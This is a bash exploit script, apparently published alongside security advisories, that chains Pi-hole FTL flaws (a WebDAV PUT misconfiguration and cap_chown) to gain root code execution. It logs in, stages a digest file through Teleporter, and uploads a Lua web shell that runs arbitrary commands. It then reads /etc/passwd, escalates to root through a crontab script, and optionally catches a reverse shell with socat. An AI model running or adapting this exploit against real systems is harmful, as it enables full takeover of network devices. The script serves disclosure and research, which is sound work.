#!/bin/bash
#
# LinnemanLabs - pi-hole advancedOpts+webdav+cap_chown, end-to-end web session to root code exec
#
# https://linnemanlabs.com/posts/pi-hole-root-with-extra-steps/
# https://github.com/linnemanlabs/advisories/
#
# logpoison lp advisory: https://github.com/pi-hole/FTL/security/advisories/GHSA-gx63-h4w6-f46g
# cap_chown advisory: https://github.com/pi-hole/pi-hole/security/advisories/GHSA-j8vh-6fp9-cjcx
#
# workaround for the civetweb patch:
#  - stage an auth-digest file using Teleporter
#  - point put_delete_auth_file to our staged digest
#  - enable serve_all
#  - upload our lua, authenticating with the put_delete_auth_file digest
#  - curl the lua cmd shell
#  - use cap_chown to take ownership of /opt/pihole/pihole-FTL-poststop.sh
#  - add our script to root crontab
#  - chown it back to root ownership
#  - wait for cron to execute out script as root
#
# works on FTL <= 6.7
#
PIHOST="${PIHOST:-http://pi.hole}"
PIPASS="${PIPASS:-password}"

LUACMD="hostname;uptime;id;grep ^Cap /proc/self/status;pihole version"

# listen for a connect-back root shell
rshell_enabled=false
rshell_port=9009
rshell_ip=""

# attempt to escalate to root
do_privesc=true
do_cleanup=false

while (($#)); do
    case $1 in
        --reverse-shell)         rshell_enabled=true ;;
        --reverse-shell-ip=*)    rshell_ip=${1#*=} ;;
        --reverse-shell-port=*)  rshell_port=${1#*=} ;;
        --enable-privesc)        do_privesc=true ;;
        --disable-privesc)       do_privesc=false ;;
        --cleanup)               do_cleanup=true ;;
        *) printf 'unknown argument: %s\n' "$1" >&2; exit 2 ;;
    esac
    shift
done

if [ "${rshell_enabled}" == "true" ];then
  if [ "${rshell_ip}" == "" ];then
    echo "[*] warnbing: --reverse-shell-ip not specified, guessing IP to use"
    rshell_ip="$( ip route get 1.1.1.1 | grep -oP 'src \K\S+' )"
  fi
fi

run_privesc() {
  # check for priv escalations
  echo "[*] attempting privilege escalation"
  # PUT privesc.sh
  res="$( curl -sk --digest -u "${webuser}:${webpass}" -X PUT --data-binary @privesc.sh -w '%{http_code}' "${PIHOST}/etc/pihole/privesc.sh" 2>&1 )"
  if [ "${res}" == "200" ];then
    echo "[*] staged /etc/pihole/privesc.sh"
  else
    echo "[-] unexpected result while staging privesc.sh: ${res}"
    exit 1
  fi

  args=""
  if [ "${rshell_enabled}" == "true" ];then
    args="rshell $rshell_ip $rshell_port"
  fi
  echo "[*] calling x.lua privilege escalation cmd=bash /etc/pihole/privesc.sh ${args}"
  reslog="$( curl -Gsk "${PIHOST}/etc/pihole/x.lua" --url-query "cmd=bash /etc/pihole/privesc.sh ${args}" )"
  echo "$reslog" | sed 's/^/  [privesc] /g'

  if [[ "${reslog}" == *"privesc-success"* ]];then
    echo "[+] Escalation succeeded, sleeping 10 seconds and checking for root proof";sleep 10
    res="$( curl -sk --url-query "cmd=cat /tmp/root-exec" "${PIHOST}/etc/pihole/x.lua" | grep -ve INFO -ve ERROR )"
    if [[ "${res}" == *"uid=0"* ]];then
      echo "[+] success, root exec"
      echo "${res}"
    else
      echo "[-] did not find uid=0 in /tmp/root-exec, did you change ROOTCMD?"
      echo "[-] are you running a vulnerable version (<= 6.7)?"
      echo "[-] check if /opt/pihole/pihole-FTL-poststop.sh has our script"
      echo "[-] or check if crontab staged properly, check if cron picked up crontab refresh"
      echo "[-] - if not then try crontab -e as pihole to change directory mtime"
      echo "[-] - or wait 60seconds if it used the cron route"
      echo "[-]"
      echo "[-] try the other non-exec LPEs (gravity chown, file-disclosures, etc)"
      exit 1
    fi
  else
    echo "[-] did not receive success signal from privesc.sh"
    echo "[*] - our pkill pihole-FTL prevents the signal being flushed"
    echo "[*] - waiting 10s and checking for root proof anyway..";sleep 10
    res="$( curl -sk --url-query "cmd=cat /tmp/root-exec" "${PIHOST}/etc/pihole/x.lua" | grep -ve INFO -ve ERROR )"
    if [[ "${res}" == *"uid=0"* ]];then
      echo "[+] success, root exec"
      echo "${res}"
    else
      echo "[-] no root-exec"
      exit 1
    fi
  fi

}

run_cleanup() {
  # clean-up
  echo "[*] cleaning up"

  # delete /etc/pihole/x.lua using the API
  curl -sk --digest -u "${webuser}:${webpass}" -X DELETE "${PIHOST}/etc/pihole/x.lua"
  echo "[*] deleting /etc/pihole/x.lua"

  # TODO: cleanup crontab

  # restore config
  webserverOpts='{"serve_all":false,"advancedOpts":[]}'
  res="$( curl -sk -H "X-FTL-SID: $SID" -X PATCH "${PIHOST}/api/config" -H 'Content-Type: application/json' \
    -d "{\"config\":{\"webserver\":${webserverOpts}}}" )"
  resadv="$( echo "${res}" | jq -c '{ serve_all: .config.webserver.serve_all, advancedOpts: .config.webserver.advancedOpts }' )"
  if [ "${resadv}" != "${webserverOpts}" ];then
    echo "[-] warning: unexpected webserver options active: ${resadv}"
  fi

  echo "[*] clean-up finished"
}

# Login (skip in no-password mode)
SID="$( curl -sk -X POST "${PIHOST}/api/auth" -H 'Content-Type: application/json'  -d "{\"password\":\"${PIPASS}\"}" | jq -r .session.sid )"
if [ "${SID}x" == "x" ] || [ "${SID}" == "null" ];then
  echo "[-] no SID - pi-hole up and password correct?"
  exit 1
fi
echo "[*] session established with ${PIHOST} sid=${SID:0:8}****"

# Fetch pi.hole realm
res="$( curl -sk -H "X-FTL-SID: $SID" "${PIHOST}/api/config/webserver/domain" )"
realm="$(echo "${res}" | jq -r ".config.webserver.domain" )"

if [ "${realm}x" == "x" ] || [ "${realm}" == "null" ];then
  echo "[-] no config.webserver.domain received. full response: ${res}"
  exit 1
fi

# Generate password for put_delete_auth_file
webuser="x"
webpass="$( mktemp -u XXXXXXXXXXXXXXXXXXXX )"
hapass="$( printf "%s:%s:%s" "$webuser" "$realm" "$webpass" | md5sum | awk '{ print $1 }' )"
# echo "[*] re-usable auth (user:realm:pass): ${webuser}:${realm}:${webpass}"

# Create crafted teleport file so we can stage a valid put_delete_auth_file file
# (can also skip this and just stage it locally if you have ssh access)
printf "%s:%s:%s\n" "$webuser" "$realm" "$hapass" > dhcp.leases
tar -zcf teleport.dhcp.tar.gz dhcp.leases
echo "[*] created put_delete_auth_file dhcp.leases teleporter file"

# POST the crafted .tar.gz to teleport (can skip this if you staged it locally already)
res="$( curl -sk -H "X-FTL-SID: $SID" -X POST "${PIHOST}/api/teleporter" -F "file=@teleport.dhcp.tar.gz" 2>&1 )"
resfile="$( echo "${res}" | jq -r .files.[0] )"
if [ "${resfile}" != "/etc/pihole/dhcp.leases" ];then
  echo "[-] unexpected result staging /etc/pihole/dhcp.leases through Teleporter: ${res}"
fi
echo "[*] staged /etc/pihole/dhcp.leases through Teleporter"

# Set CivetWeb advancedOpts put_delete_auth_file, document_root, and serve_all
webserverOpts='{"serve_all":true,"advancedOpts":["put_delete_auth_file=/etc/pihole/dhcp.leases","document_root=/"]}'
#res="$( curl -sk -H "X-FTL-SID: $SID" -X PATCH "${PIHOST}/api/config" -H "Content-Type: application/json" \
#    -d '{"config":{"webserver":{"serve_all":true, "advancedOpts":["put_delete_auth_file=/etc/pihole/dhcp.leases","document_root=/"]}}}' 2>&1 )"


#curl -vvvvk -H "X-FTL-SID: $SID" -X PATCH "${PIHOST}/api/config" -H "Content-Type: application/json" \
#    -d "{\"config\":{\"webserver\":${webserverOpts}}}" 2>&1
res="$( curl -sk -H "X-FTL-SID: $SID" -X PATCH "${PIHOST}/api/config" -H "Content-Type: application/json" \
    -d "{\"config\":{\"webserver\":${webserverOpts}}}" 2>&1 )"
resadv="$( echo "${res}" | jq -c '{ serve_all: .config.webserver.serve_all, advancedOpts: .config.webserver.advancedOpts }' )"
if [ "${resadv}" != "${webserverOpts}" ];then
  echo "[-] unexpected advancedOpts result: ${resadv}"
  exit 1
fi
echo "[*] set advancedOpts: ${resadv}"

# give FTL time to restart
sleep 3

cat > x.lua <<'EOF'
local cmd = mg.get_var(mg.request_info.query_string or "", "cmd") or "id"
local f = io.popen(cmd .. " 2>&1")
local out = f and f:read("*a") or "popen-failed"
if f then f:close() end
mg.write("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n")
mg.write(out)
EOF

# PUT x.lua
res="$( curl -sk --digest -u "${webuser}:${webpass}" -X PUT --data-binary @x.lua -w '%{http_code}' "${PIHOST}/etc/pihole/x.lua" 2>&1 )"
if [ "${res}" == "200" ];then
  echo "[*] staged /etc/pihole/x.lua"
else
  echo "[-] unexpected result while staging x.lua: ${res}"
  exit 1
fi

## call x.lua
#res="$( curl -sk "${PIHOST}/etc/pihole/x.lua?cmd=id" )"
#printf "[*] called x.lua cmd=id\n%s\n\n" "$res"

# call x.lua
if [ "${LUACMD}x" != "x" ];then
  res="$( curl -Gsk "${PIHOST}/etc/pihole/x.lua" --url-query "cmd=${LUACMD}" )"
  printf "[+] called x.lua LUACMD cmd=${LUACMD}:\n%s\n" "$res"
fi

# view /etc/passwd
res="$( curl -sk "${PIHOST}/etc/passwd" | grep -E "/bin/.*sh" )"
printf "[+] accessed /etc/passwd:\n%s\n" "$res"

# view /etc/pihole/pihole.toml
#res="$( curl -sk "${PIHOST}/etc/pihole/pihole.toml" )"
#printf "[+] accessed /etc/pihole/pihole.toml: %s\n\n" "$res"

## call privesc.sh
#res="$( curl -Gsk "${PIHOST}/etc/pihole/x.lua" --data-urlencode "cmd=bash /etc/pihole/privesc.sh" )"
#printf "[+] called x.lua privilege escalation cmd=bash /etc/pihole/privesc.sh:\n%s\n" "$res"
# call privesc.sh
if [ "${do_privesc}" == "true" ];then
  run_privesc
else
  echo "[-] skipping privilege escalation (use --enable-privesc to enable)"
fi

# clean-up
if [ "${do_cleanup}" == "true" ];then
  run_cleanup
else
  echo "[-] skipping cleanup (use --cleanup to enable)"
fi

if [ "${rshell_enabled}" == "true" ];then
  echo "[*] starting listener for remote shell"
  socat -,echo=1 TCP4-LISTEN:"${rshell_port}",bind="0.0.0.0",reuseaddr
fi

echo "[+] done"
